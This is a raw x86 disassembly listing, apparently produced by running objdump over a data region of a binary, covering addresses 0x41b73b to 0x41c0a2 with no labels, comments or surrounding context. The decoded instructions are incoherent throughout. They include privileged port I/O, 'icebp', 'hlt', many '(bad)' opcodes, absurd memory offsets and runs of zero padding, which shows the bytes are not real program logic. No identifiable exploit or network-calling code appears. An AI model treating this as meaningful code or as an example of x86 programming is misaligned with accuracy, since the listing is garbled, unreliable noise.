  41b73b:	sub    ebp,DWORD PTR [eax+0x70dba6a8]
  41b741:	mov    al,BYTE PTR [edx+0x63]
  41b744:	dec    ebx
  41b745:	lock mov ds:0xc7a196a8,eax
  41b74b:	mov    dl,0xfb
  41b74d:	inc    ebx
  41b74e:	leave  
  41b74f:	ror    BYTE PTR [edx-0x682a1a4],0x63
  41b756:	mov    bh,0xc0
  41b758:	aam    0x5c
  41b75a:	mov    ds:0x301c919,al
  41b75f:	es push ss
  41b761:	dec    eax
  41b762:	adc    BYTE PTR [edi+ecx*2-0x7bda14d1],al
  41b769:	mov    BYTE PTR [esi],dl
  41b76b:	jns    0x41b786
  41b76d:	into   
  41b76e:	sub    al,0xe7
  41b770:	mov    al,ds:0x6dca973e
  41b775:	jo     0x41b7dd
  41b777:	and    ecx,DWORD PTR [esi-0x1189f5e4]
  41b77d:	stos   BYTE PTR es:[edi],al
  41b77e:	push   ds
  41b77f:	ins    DWORD PTR es:[edi],dx
  41b780:	sub    BYTE PTR [ecx+0x71],dl
  41b783:	pop    ecx
  41b784:	mov    BYTE PTR [edx+0x3b],dl
  41b787:	add    al,0x53
  41b789:	into   
  41b78a:	pop    ss
  41b78b:	inc    edx
  41b78c:	adc    al,0xa3
  41b78e:	cmp    BYTE PTR [ecx+0x157fd1e1],cl
  41b794:	mov    eax,ebx
  41b796:	add    eax,0x5a335b8a
  41b79b:	out    0xa5,eax
  41b79d:	cdq    
  41b79e:	rcl    DWORD PTR [esi-0x637b76f8],cl
  41b7a4:	shl    BYTE PTR [ebp-0x30],cl
  41b7a7:	shr    ecx,cl
  41b7a9:	clc    
  41b7aa:	inc    esp
  41b7ab:	dec    ebp
  41b7ac:	jne    0x41b7fc
  41b7ae:	mov    ecx,0xd5c99aa6
  41b7b3:	gs mov esp,fs
  41b7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b7:	add    ebp,DWORD PTR ds:0xbc7da3d8
  41b7bd:	and    esi,ebx
  41b7bf:	pop    esp
  41b7c0:	ins    DWORD PTR es:[edi],dx
  41b7c1:	and    ebp,DWORD PTR [edx]
  41b7c3:	mov    cl,0x33
  41b7c5:	add    al,0xac
  41b7c8:	pop    ebp
  41b7c9:	cmp    edx,esp
  41b7cb:	sar    DWORD PTR [ebp-0xc654f8a],0xda
  41b7d2:	and    eax,0xdf06b96d
  41b7d7:	leave  
  41b7d8:	pop    ss
  41b7d9:	aaa    
  41b7da:	inc    edx
  41b7db:	push   ebx
  41b7dc:	rcl    DWORD PTR [eax],cl
  41b7de:	mov    bl,0x52
  41b7e0:	popf   
  41b7e1:	test   DWORD PTR ds:0x2c577df6,edx
  41b7e7:	cmp    DWORD PTR [eax+edi*4-0x7e],eax
  41b7eb:	mov    bh,BYTE PTR [ebx+0x4a1f79ce]
  41b7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f2:	out    dx,eax
  41b7f3:	pop    ss
  41b7f4:	std    
  41b7f5:	std    
  41b7f6:	xchg   edx,eax
  41b7f7:	aas    
  41b7f8:	add    BYTE PTR [edi],dl
  41b7fa:	sti    
  41b7fb:	mov    edi,DWORD PTR [ecx+0x5e]
  41b7fe:	sbb    BYTE PTR [eax+0x4f2ff4ed],cl
  41b804:	push   ss
  41b805:	inc    eax
  41b806:	iret   
  41b807:	imul   edi,DWORD PTR [edi],0x67c33433
  41b80d:	or     DWORD PTR [ebx],esi
  41b80f:	in     eax,dx
  41b810:	mov    ecx,0x0
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x30
  41b881:	outs   dx,BYTE PTR ds:[esi]
  41b882:	jo     0x41b856
  41b884:	jno    0x41b8aa
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0x47000001
  41b88d:	sub    al,0x61
  41b88f:	aad    0x25
  41b891:	inc    esi
  41b892:	popa   
  41b893:	out    0x8,al
  41b895:	mov    eax,ds:0x8b35a13
  41b89a:	push   edi
  41b89b:	retf   0x26e9
  41b89e:	sub    eax,0x558a1531
  41b8a3:	push   es
  41b8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8a5:	in     al,0xa0
  41b8a7:	lods   eax,DWORD PTR ds:[esi]
  41b8a8:	mul    bh
  41b8aa:	aam    0xa0
  41b8ac:	inc    esp
  41b8ad:	and    eax,0x59a82208
  41b8b2:	xchg   esp,eax
  41b8b3:	xchg   esi,eax
  41b8b4:	outs   dx,BYTE PTR ds:[esi]
  41b8b5:	pop    esi
  41b8b6:	push   ecx
  41b8b7:	outs   dx,BYTE PTR ds:[esi]
  41b8b8:	aam    0x3f
  41b8ba:	stc    
  41b8bb:	xor    cl,BYTE PTR [edi+0x1e]
  41b8be:	sbb    DWORD PTR [esp+esi*2-0x45c3d7c3],esi
  41b8c5:	outs   dx,DWORD PTR ds:[esi]
  41b8c6:	jns    0x41b8ac
  41b8c8:	mov    eax,ds:0xafafd79
  41b8cd:	loope  0x41b934
  41b8cf:	fs and ebx,ecx
  41b8d2:	leave  
  41b8d3:	pop    ds
  41b8d4:	je     0x41b86e
  41b8d6:	shl    BYTE PTR [eax],0x9
  41b8d9:	mov    bl,0x87
  41b8db:	add    eax,0x36aef0c4
  41b8e0:	fwait
  41b8e1:	add    BYTE PTR [eax+0x4039676c],0xca
  41b8e8:	dec    edi
  41b8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ea:	(bad)  
  41b8eb:	jne    0x41b921
  41b8ed:	adc    edi,DWORD PTR [ecx+eax*4+0x3a]
  41b8f1:	adc    al,0xa4
  41b8f3:	xlat   BYTE PTR ds:[ebx]
  41b8f4:	sbb    eax,0x99a1e675
  41b8f9:	ins    BYTE PTR es:[edi],dx
  41b8fa:	cdq    
  41b8fb:	pop    es
  41b8fc:	repnz push ebp
  41b8fe:	jo     0x41b8f6
  41b900:	imul   edi,DWORD PTR [ebx-0x47],0xb642f75
  41b907:	xchg   esp,eax
  41b908:	adc    al,0xc3
  41b90a:	pushf  
  41b90b:	xchg   ebx,eax
  41b90c:	and    al,0xc2
  41b90e:	cli    
  41b90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b910:	sbb    BYTE PTR [ebx],dh
  41b912:	push   cx
  41b914:	or     DWORD PTR [eax],edi
  41b916:	xchg   ebx,eax
  41b917:	adc    eax,0x6654d7e8
  41b91c:	add    ebx,edi
  41b91e:	dec    eax
  41b91f:	pop    ebx
  41b920:	lea    ebx,ds:0x637b3e89
  41b926:	mov    dh,0x4
  41b928:	lods   eax,DWORD PTR ds:[esi]
  41b929:	imul   edi,DWORD PTR [eax-0x22],0x81e02531
  41b930:	imul   esi,DWORD PTR [esp+edx*1+0x3d74288c],0x380589a5
  41b93b:	retf   
  41b93c:	mov    al,0xd2
  41b93e:	add    dh,BYTE PTR [edi+0x37]
  41b941:	imul   esp,DWORD PTR [eax-0x6cb8e88],0x3e2c9ae3
  41b94b:	loope  0x41b936
  41b94d:	sbb    BYTE PTR [edx],ch
  41b94f:	jmp    0x41eec719
  41b954:	js     0x41b96d
  41b956:	aaa    
  41b957:	pop    ss
  41b958:	inc    esp
  41b959:	(bad)  
  41b95a:	out    0xb5,eax
  41b95c:	mov    BYTE PTR [ebp+0x2e94c15],ah
  41b962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b963:	sbb    BYTE PTR [eax-0x79],ch
  41b966:	sbb    BYTE PTR [esi-0x28],bl
  41b969:	mov    bh,0xb
  41b96b:	test   DWORD PTR [edi+0x5f],edi
  41b96e:	pop    esp
  41b96f:	mov    ds:0xce264721,al
  41b974:	test   al,0x7b
  41b976:	scas   al,BYTE PTR es:[edi]
  41b977:	or     eax,0xe832294c
  41b97c:	fisttp QWORD PTR [esi]
  41b97e:	cmp    eax,0xecaa9ef1
  41b983:	sbb    BYTE PTR [edi+0x1c],ch
  41b986:	(bad)  
  41b987:	into   
  41b988:	sti    
  41b989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b98a:	sub    eax,DWORD PTR [edi+esi*4+0x50901ad6]
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	jae    0x41ba6c
  41ba02:	mov    eax,ds:0x1257614
  41ba07:	add    BYTE PTR ds:0x8000001,al
  41ba0d:	sbb    al,0x88
  41ba0f:	mov    al,ah
  41ba11:	loop   0x41ba76
  41ba13:	jle    0x41ba54
  41ba15:	imul   edx,ebx,0xffffffa0
  41ba18:	dec    edx
  41ba19:	mov    esp,0x404b4ae1
  41ba1e:	pop    esp
  41ba1f:	jecxz  0x41b9ee
  41ba21:	pop    esi
  41ba22:	pop    edx
  41ba23:	mov    edi,0x3d21b4b1
  41ba28:	and    DWORD PTR [ecx],edi
  41ba2a:	sub    BYTE PTR [eax+0xadad18b],dh
  41ba30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba31:	mov    edi,0xddc70703
  41ba36:	icebp  
  41ba37:	push   eax
  41ba38:	pop    ds
  41ba39:	out    dx,al
  41ba3a:	data16 scas al,BYTE PTR es:[edi]
  41ba3c:	push   esp
  41ba3d:	dec    ecx
  41ba3e:	mov    bl,0xdb
  41ba40:	mov    al,ds:0x2f0792fa
  41ba45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba46:	xor    DWORD PTR [ebp+0x5e6177fe],ebx
  41ba4c:	test   al,0xab
  41ba4e:	jae    0x41b9db
  41ba50:	dec    eax
  41ba51:	add    BYTE PTR ds:0xa3878d8a,bl
  41ba57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba58:	pusha  
  41ba59:	xchg   DWORD PTR [ebp+0xb],ecx
  41ba5c:	or     ebp,DWORD PTR [edx-0x5cb7282e]
  41ba62:	push   esi
  41ba63:	out    dx,al
  41ba64:	rcr    BYTE PTR es:[ecx+0x1bdf9978],cl
  41ba6b:	ret    0x53
  41ba6e:	out    0xc7,al
  41ba70:	push   ds
  41ba71:	dec    esp
  41ba72:	fidivr WORD PTR [edi]
  41ba74:	rcr    BYTE PTR [ebx],cl
  41ba76:	imul   esi,DWORD PTR [eax+0x282396cf],0x7f
  41ba7d:	push   ebx
  41ba7e:	in     al,dx
  41ba7f:	xor    DWORD PTR [edi],esi
  41ba81:	pop    esi
  41ba82:	retf   0xb529
  41ba85:	sbb    eax,0x6b730021
  41ba8a:	pop    esi
  41ba8b:	scas   eax,DWORD PTR es:[edi]
  41ba8c:	test   DWORD PTR [ecx-0x12],edx
  41ba8f:	pop    edi
  41ba90:	mov    al,dh
  41ba92:	(bad)  
  41ba94:	inc    edi
  41ba95:	mov    bl,0xf
  41ba97:	mov    ecx,DWORD PTR [esi]
  41ba99:	rcr    DWORD PTR [esi+0x4d],cl
  41ba9c:	pop    edi
  41ba9d:	push   ds
  41ba9e:	and    ebp,DWORD PTR [edx]
  41baa0:	dec    edx
  41baa1:	nop
  41baa2:	xlat   BYTE PTR ds:[ebx]
  41baa3:	xor    esp,DWORD PTR [edi]
  41baa5:	(bad)  
  41baa6:	rol    ah,1
  41baa8:	inc    DWORD PTR [edi+edi*2-0x579a4f0]
  41baaf:	and    BYTE PTR [eax],al
  41bab1:	jns    0x41bac7
  41bab3:	fwait
  41bab4:	jnp    0x41ba70
  41bab6:	test   BYTE PTR [esi+esi*8-0x47],0xc4
  41babb:	dec    edx
  41babc:	sti    
  41babd:	mov    ebp,DWORD PTR [eax-0x3e]
  41bac0:	dec    ebp
  41bac1:	xor    eax,0x5b141eae
  41bac6:	mov    eax,ds:0x3f7d07e0
  41bacb:	sbb    esp,DWORD PTR [ebp-0x74]
  41bace:	(bad)  
  41bacf:	leave  
  41bad0:	aas    
  41bad1:	bound  ebx,QWORD PTR [ebp+ecx*2+0x1d]
  41bad5:	xlat   BYTE PTR ds:[ebx]
  41bad6:	push   0x5f
  41bad8:	mov    bl,0x55
  41bada:	sbb    al,0x7d
  41badc:	fs jb  0x41bab0
  41badf:	loopne 0x41bb09
  41bae1:	add    eax,0xdb2f3318
  41bae6:	data16 mov es,WORD PTR cs:[ecx-0x24616fe1]
  41baee:	pusha  
  41baef:	and    eax,0xda92385a
  41baf4:	lock push ebp
  41baf6:	push   ebp
  41baf7:	xlat   BYTE PTR ds:[ebx]
  41baf8:	jg     0x41ba8b
  41bafa:	fcomp  QWORD PTR [edx]
  41bafc:	call   0xec29a8eb
  41bb01:	sub    BYTE PTR [ecx*8+0x31b393e9],cl
  41bb08:	pop    es
  41bb09:	lea    edi,[eax+0x793aab00]
  41bb0f:	adc    DWORD PTR [ecx],0x0
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x4a],cx
  41bb81:	imul   esp,DWORD PTR [ebx],0x7f
  41bb84:	jnp    0x41bbac
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0xcc000001
  41bb8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb8e:	xchg   esp,eax
  41bb8f:	cmp    al,BYTE PTR [ecx+0x3e]
  41bb92:	adc    eax,0x3a4a4a49
  41bb97:	popa   
  41bb98:	lods   al,BYTE PTR ds:[esi]
  41bb99:	inc    ebx
  41bb9a:	xchg   ebp,eax
  41bb9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb9c:	xor    BYTE PTR [edx+0x12],bl
  41bb9f:	jge    0x41bba9
  41bba1:	imul   edi,DWORD PTR [ecx],0x4919fe9
  41bba7:	adc    DWORD PTR [esi],ebx
  41bba9:	ret    
  41bbaa:	rcl    DWORD PTR [eax-0x7a9595ec],1
  41bbb0:	enter  0x7194,0xaf
  41bbb4:	fdivr  DWORD PTR [ecx]
  41bbb6:	pop    ebp
  41bbb7:	enter  0x8959,0xb3
  41bbbb:	xor    eax,0x11b9ad82
  41bbc0:	mov    bl,0x6d
  41bbc2:	and    dl,BYTE PTR [edx]
  41bbc4:	aaa    
  41bbc5:	(bad)  
  41bbc6:	dec    ebp
  41bbc7:	test   BYTE PTR [ecx-0x2e],bl
  41bbca:	test   eax,0x6755ce78
  41bbcf:	xlat   BYTE PTR ds:[ebx]
  41bbd0:	xchg   ebp,eax
  41bbd1:	call   0x68b5:0xc7dc675b
  41bbd8:	lds    edi,FWORD PTR [edi+0x43]
  41bbdb:	add    edi,DWORD PTR [edi]
  41bbdd:	mov    al,0x81
  41bbdf:	sub    BYTE PTR [esi+0x1cb07633],bl
  41bbe5:	aam    0x7b
  41bbe7:	adc    BYTE PTR [esi],ah
  41bbe9:	xchg   ecx,eax
  41bbea:	sub    dl,BYTE PTR [esp+eax*2+0x2a]
  41bbee:	pop    ebx
  41bbef:	add    BYTE PTR [ebp+0xd83960],dl
  41bbf5:	adc    ah,BYTE PTR [ecx-0x429a85cf]
  41bbfb:	dec    esp
  41bbfc:	pop    ds
  41bbfd:	sub    al,0xcf
  41bbff:	adc    DWORD PTR [edx],esp
  41bc01:	adc    al,al
  41bc03:	adc    al,0x26
  41bc05:	push   es
  41bc06:	ja     0x41bbeb
  41bc08:	aad    0x36
  41bc0a:	cld    
  41bc0b:	push   es
  41bc0c:	ror    DWORD PTR [esi+0x53f63288],cl
  41bc12:	ss add al,0x33
  41bc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc16:	call   0x5133:0x4f6bbb46
  41bc1d:	(bad)  
  41bc1e:	cmp    eax,esp
  41bc20:	xor    esi,DWORD PTR [esi]
  41bc22:	mov    esp,0x1f9c97d6
  41bc27:	add    DWORD PTR [eax+edx*1-0x5bfb0b5f],0xffffffb0
  41bc2f:	frndint 
  41bc31:	out    0x9c,eax
  41bc33:	or     ah,BYTE PTR [ebx-0x7eeb3d69]
  41bc39:	into   
  41bc3a:	jge    0x41bc91
  41bc3c:	pop    ebx
  41bc3d:	cmp    DWORD PTR [edi],ecx
  41bc3f:	push   ss
  41bc40:	into   
  41bc41:	pop    ss
  41bc42:	stc    
  41bc43:	mov    ds:0x5829d467,al
  41bc48:	bound  ebp,QWORD PTR [ecx+0x44]
  41bc4b:	daa    
  41bc4c:	push   ss
  41bc4d:	xor    eax,0x15f209ff
  41bc52:	dec    ebp
  41bc53:	push   ecx
  41bc54:	into   
  41bc55:	mov    ch,0x4e
  41bc57:	fwait
  41bc58:	in     al,0x54
  41bc5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc5b:	push   ecx
  41bc5c:	mov    ch,0x1
  41bc5e:	cmp    DWORD PTR [edi+0x25],0x5465f0b9
  41bc65:	inc    edi
  41bc66:	add    BYTE PTR [edx],bl
  41bc68:	pop    ss
  41bc69:	sub    ebx,ebx
  41bc6b:	adc    DWORD PTR [ecx+0x375ed05e],0x8c36c25b
  41bc75:	or     BYTE PTR [edi],ch
  41bc77:	sahf   
  41bc78:	icebp  
  41bc79:	pop    eax
  41bc7a:	jno    0x41bc79
  41bc7c:	cwde   
  41bc7d:	xchg   ebp,eax
  41bc7e:	push   ss
  41bc7f:	or     cl,BYTE PTR [edx+ebx*2]
  41bc82:	std    
  41bc83:	or     eax,0xa8d14ef0
  41bc88:	jle    0x41bcd5
  41bc8a:	jl     0x41bc46
  41bc8c:	enter  0x2a2a,0xbe
  41bc90:	jle    0x41bc92
	...
  41bcf2:	add    BYTE PTR [eax],al
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xfa23d9d8
  41bd02:	adc    ah,BYTE PTR [ecx-0x80]
  41bd05:	daa    
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    eax,0x91000001
  41bd0d:	mov    ds:0xac2ef4ac,al
  41bd12:	xor    cl,BYTE PTR [ebp+0xe9771d8]
  41bd18:	cmp    al,0xa8
  41bd1a:	aad    0xfa
  41bd1c:	ja     0x41bd4e
  41bd1e:	xchg   ebp,eax
  41bd1f:	stc    
  41bd20:	or     al,0xd
  41bd22:	mov    ebx,0x9d213c9d
  41bd27:	mov    dh,0x9d
  41bd29:	dec    edi
  41bd2a:	hlt    
  41bd2b:	pop    eax
  41bd2c:	das    
  41bd2d:	outs   dx,BYTE PTR ds:[esi]
  41bd2e:	add    ebp,DWORD PTR [edx+esi*1-0x50]
  41bd32:	inc    edi
  41bd33:	or     eax,0x8415c041
  41bd38:	scas   eax,DWORD PTR es:[edi]
  41bd39:	mov    al,0xc3
  41bd3b:	js     0x41bdb2
  41bd3d:	loopne 0x41bcf0
  41bd3f:	mov    cl,0x23
  41bd41:	cdq    
  41bd42:	sub    BYTE PTR [esi+0x1c],al
  41bd45:	rol    al,0x5a
  41bd48:	popf   
  41bd49:	pop    ebp
  41bd4a:	ret    
  41bd4b:	std    
  41bd4c:	jp     0x41bdc8
  41bd4e:	sub    BYTE PTR [ebx+0x23],0x2b
  41bd52:	jl     0x41bda1
  41bd54:	and    dh,bh
  41bd56:	inc    eax
  41bd57:	xor    ecx,DWORD PTR [edx+0x60]
  41bd5a:	cmp    DWORD PTR [eax],esp
  41bd5c:	cmp    esp,DWORD PTR [esi]
  41bd5e:	adc    esp,DWORD PTR [ecx-0x48]
  41bd61:	repz xchg ecx,eax
  41bd63:	adc    eax,0xe3703293
  41bd68:	mov    ch,0x8
  41bd6a:	mov    ecx,0x100e236
  41bd6f:	push   edx
  41bd70:	ins    BYTE PTR es:[edi],dx
  41bd71:	in     eax,dx
  41bd72:	jmp    0x41bd74
  41bd74:	aad    0x6e
  41bd76:	mov    eax,ds:0x49672ccc
  41bd7b:	cwde   
  41bd7c:	(bad)  
  41bd7e:	push   0x7
  41bd80:	arpl   WORD PTR [edx-0x44c90880],bp
  41bd86:	xchg   ebp,eax
  41bd87:	inc    edx
  41bd88:	mov    edi,0xbf07a7ad
  41bd8d:	sbb    dh,BYTE PTR [edx]
  41bd8f:	mov    eax,ds:0xc9c50d57
  41bd94:	popf   
  41bd95:	clc    
  41bd96:	jno    0x41bdb4
  41bd98:	xlat   BYTE PTR ds:[ebx]
  41bd99:	pop    edi
  41bd9a:	jecxz  0x41be03
  41bd9c:	cmc    
  41bd9d:	(bad)
  41bda1:	push   edi
  41bda2:	cmp    esp,ebx
  41bda4:	fidiv  WORD PTR [ecx]
  41bda6:	push   esp
  41bda7:	inc    esi
  41bda8:	sub    DWORD PTR [ecx+0x4],esi
  41bdab:	mov    edx,0xbfad3d98
  41bdb0:	stc    
  41bdb1:	(bad)  
  41bdb2:	fwait
  41bdb3:	sbb    ebp,DWORD PTR [esp+ebp*4]
  41bdb6:	inc    edi
  41bdb7:	rcr    DWORD PTR gs:[edi-0x5d],1
  41bdbb:	mov    ecx,0x208eef5f
  41bdc0:	sub    DWORD PTR [edx],esp
  41bdc2:	pushf  
  41bdc3:	int    0x97
  41bdc5:	add    eax,0xd2140044
  41bdca:	push   ss
  41bdcb:	iret   
  41bdcc:	ror    BYTE PTR [esi-0x2565d8d2],0x32
  41bdd3:	leave  
  41bdd4:	push   edx
  41bdd5:	dec    eax
  41bdd6:	loope  0x41bdeb
  41bdd8:	retf   
  41bdd9:	xchg   esi,eax
  41bdda:	pop    eax
  41bddb:	inc    edx
  41bddc:	pop    ebp
  41bddd:	dec    edx
  41bdde:	mov    eax,0xca057729
  41bde3:	inc    edi
  41bde4:	fwait
  41bde5:	pop    esp
  41bde6:	xor    al,0xe9
  41bde8:	dec    eax
  41bde9:	sub    eax,esi
  41bdeb:	pop    ss
  41bdec:	inc    ecx
  41bded:	rcr    BYTE PTR [ecx+0x58],cl
  41bdf0:	stos   BYTE PTR es:[edi],al
  41bdf1:	in     al,dx
  41bdf2:	and    BYTE PTR [ecx+edi*1+0x390d3b38],bh
  41bdf9:	pop    ebp
  41bdfa:	and    DWORD PTR [eax+0x6d],0xf9c00e92
  41be01:	outs   dx,BYTE PTR ds:[esi]
  41be02:	push   es
  41be03:	cmp    BYTE PTR ds:0x9920527f,dh
  41be09:	jnp    0x41bdc3
  41be0b:	pop    ds
  41be0c:	or     al,0xd
  41be0e:	cmp    DWORD PTR [eax-0x5],ebx
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x1b9d3f66]
  41be82:	lods   al,BYTE PTR ds:[esi]
  41be83:	mov    ah,0x85
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR ds:0xec000001,al
  41be8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8e:	es pop ebx
  41be90:	dec    edi
  41be91:	cmp    DWORD PTR [ecx],ecx
  41be93:	imul   edi,DWORD PTR [ebx-0x1c],0xffffffc1
  41be97:	dec    ebx
  41be98:	lods   al,BYTE PTR ds:[esi]
  41be99:	dec    ebx
  41be9a:	push   0x67971ac5
  41be9f:	pop    esp
  41bea0:	fld    QWORD PTR [ebx-0x4a]
  41bea3:	add    edi,ebp
  41bea5:	sbb    dh,BYTE PTR [esi+0x34faed7e]
  41beab:	cdq    
  41beac:	adc    al,0x23
  41beae:	bound  ebp,QWORD PTR [ecx+esi*4-0x4a]
  41beb2:	push   0x4bca18ac
  41beb7:	enter  0xa963,0x22
  41bebb:	pop    ds
  41bebc:	add    edx,DWORD PTR [ecx+esi*1-0x76]
  41bec0:	and    eax,0x688e4360
  41bec5:	imul   ecx,DWORD PTR [ebp-0x786a6f7c],0x6e16c1d9
  41becf:	pop    eax
  41bed0:	rcl    bh,cl
  41bed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bed3:	pop    edx
  41bed4:	xlat   BYTE PTR ds:[ebx]
  41bed5:	inc    eax
  41bed6:	fcmovu st,st(3)
  41bed8:	cmp    eax,0xce665be5
  41bedd:	outs   dx,BYTE PTR ds:[esi]
  41bede:	dec    ebp
  41bedf:	jle    0x41bedc
  41bee1:	dec    eax
  41bee2:	and    DWORD PTR [ebx+0x3db4a121],ebx
  41bee8:	inc    ecx
  41bee9:	fwait
  41beea:	cs or  eax,0x5912d690
  41bef0:	inc    ebx
  41bef1:	daa    
  41bef2:	lea    eax,[ecx]
  41bef4:	mov    ds:0x180d0e7b,al
  41bef9:	add    ebx,DWORD PTR [esp+edi*1+0x57]
  41befd:	pop    ss
  41befe:	inc    ecx
  41beff:	sub    BYTE PTR [ebx+0x52],dh
  41bf02:	adc    DWORD PTR [ecx+0x4461118d],edi
  41bf08:	pop    esp
  41bf09:	pop    ebp
  41bf0a:	jge    0x41be9b
  41bf0c:	sbb    eax,DWORD PTR [esi+edx*8+0x78bf0fd4]
  41bf13:	call   0xc728f3f1
  41bf18:	push   esp
  41bf19:	xchg   ebx,eax
  41bf1a:	sbb    bl,ch
  41bf1c:	push   ebx
  41bf1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf1e:	data16 and BYTE PTR [ecx-0x18aa781c],dl
  41bf25:	mov    bl,0xcb
  41bf27:	or     eax,DWORD PTR [edi-0x65]
  41bf2a:	push   ds
  41bf2b:	mov    cl,0xfc
  41bf2d:	pop    ecx
  41bf2e:	rcr    DWORD PTR [esi-0x20147dfe],cl
  41bf34:	push   0xfffffff3
  41bf36:	and    edi,DWORD PTR [ebx+0x55f5e251]
  41bf3c:	and    ch,al
  41bf3e:	xchg   ebp,eax
  41bf3f:	push   ebx
  41bf40:	fwait
  41bf41:	icebp  
  41bf42:	pop    ss
  41bf43:	popf   
  41bf44:	mov    BYTE PTR [ebx-0x7b268911],0x36
  41bf4b:	sbb    edx,DWORD PTR [ebx+0x72f9e63b]
  41bf51:	jo     0x41bfa9
  41bf53:	xchg   edi,eax
  41bf54:	jbe    0x41bf59
  41bf56:	into   
  41bf57:	or     ah,cl
  41bf59:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41bf5b:	test   DWORD PTR [ebx+0x63cca34e],edi
  41bf61:	das    
  41bf62:	cmp    ebp,DWORD PTR [ebx+0x62cc0310]
  41bf68:	xchg   ecx,eax
  41bf69:	jecxz  0x41bfbc
  41bf6b:	sub    DWORD PTR [ebx-0x6772f7f2],esp
  41bf71:	pop    eax
  41bf72:	or     cl,BYTE PTR [edi-0x41]
  41bf75:	xchg   edx,eax
  41bf76:	aas    
  41bf77:	out    dx,eax
  41bf78:	mov    ebx,0x51f19307
  41bf7d:	icebp  
  41bf7e:	gs pop ds
  41bf80:	sbb    dh,ch
  41bf82:	repz jb 0x41bf26
  41bf85:	and    esi,DWORD PTR [eax-0xc]
  41bf88:	mov    ebx,0x74873f1
  41bf8d:	mov    al,0x3a
  41bf8f:	push   ss
  41bf90:	cmc    
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	js     0x41c05b
  41c002:	pop    ebx
  41c003:	mov    ecx,DWORD PTR [edx+0x5000129]
  41c009:	add    DWORD PTR [eax],eax
  41c00b:	add    BYTE PTR [ebx+0x570aac06],ch
  41c011:	sub    DWORD PTR [ebx+0x43],esp
  41c014:	loop   0x41c054
  41c016:	call   0x647a8c15
  41c01b:	fdivp  st(6),st
  41c01d:	mov    dl,0xb1
  41c01f:	jnp    0x41c06f
  41c021:	aam    0x5d
  41c023:	push   edi
  41c024:	or     eax,DWORD PTR ds:0x5a8f4f00
  41c02a:	js     0x41bff3
  41c02c:	rol    BYTE PTR [edi-0x41],cl
  41c02f:	fs or  al,0xdc
  41c032:	mov    ah,0x8a
  41c034:	mov    BYTE PTR [ecx],cl
  41c036:	aas    
  41c037:	pop    ds
  41c038:	sti    
  41c039:	mov    edi,0x814f765d
  41c03e:	sbb    ebp,DWORD PTR [esi+ecx*4+0x16d081b7]
  41c045:	mov    eax,ds:0xa286daac
  41c04a:	jg     0x41c00e
  41c04c:	mov    cl,0x43
  41c04e:	sub    DWORD PTR [edi],0x6c
  41c051:	rcr    DWORD PTR [eax-0x6cd6262e],0x2c
  41c058:	jl     0x41c0ce
  41c05a:	and    eax,DWORD PTR [ebx+0x6942f0c]
  41c060:	cmp    esi,DWORD PTR [esi+0x5a26c619]
  41c066:	sbb    eax,0xbf151096
  41c06b:	add    eax,eax
  41c06d:	ret    0x161a
  41c070:	clc    
  41c071:	into   
  41c072:	and    bh,0xad
  41c075:	or     edx,ebx
  41c077:	jl     0x41c082
  41c079:	xor    esi,ecx
  41c07b:	mov    ecx,0xed8eb31c
  41c080:	fisubr DWORD PTR [ebx-0x26442f86]
  41c086:	dec    edi
  41c087:	into   
  41c088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c089:	and    cl,dh
  41c08b:	pop    ds
  41c08c:	in     eax,dx
  41c08d:	mov    ebp,0x6d2d8415
  41c092:	and    bl,BYTE PTR [ebp-0x2d0fb610]
  41c098:	add    DWORD PTR [esp+esi*2],edx
  41c09b:	inc    eax
  41c09c:	sub    al,0x1e
  41c09e:	and    ebp,ecx
  41c0a0:	int3   
  41c0a1:	scas   eax,DWORD PTR es:[edi]
  41c0a2:	cwde   
